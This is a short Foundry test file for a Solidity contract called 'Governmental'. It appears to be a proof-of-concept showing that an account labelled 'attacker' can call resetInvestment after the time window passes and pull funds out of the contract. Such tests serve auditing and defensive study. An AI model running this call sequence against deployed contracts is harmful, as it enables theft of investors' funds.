contract GovernmentalTest is Test {
    Governmental governmental;
    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fund accounts
        vm.deal(deployer, 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(attacker, 10 ether);

        // Deploy contract with sufficient funds (> 1 ether)
        vm.prank(deployer);
        governmental = new Governmental{value: 2 ether}();

        // Make valid investment with sufficient amount
        vm.prank(alice);
        governmental.invest{value: 1 ether}();

        // Advance time beyond reset window
        vm.warp(block.timestamp + 61 seconds);
    }

    function test_resetInvestmentByArbitrarySender() public {
        // Record initial contract balance
        uint256 initialContractBalance = address(governmental).balance;

        // Attacker (non-owner) triggers reset - should succeed
        vm.prank(attacker);
        governmental.resetInvestment();

        // Verify contract balance reduced by expected amount
        assertEq(
            address(governmental).balance, 
            1 ether, 
            "Contract must retain exactly 1 ether after reset"
        );

        // Verify funds were extracted from contract
        assertLt(
            address(governmental).balance,
            initialContractBalance,
            "Attacker caused improper fund extraction"
        );
    }
}
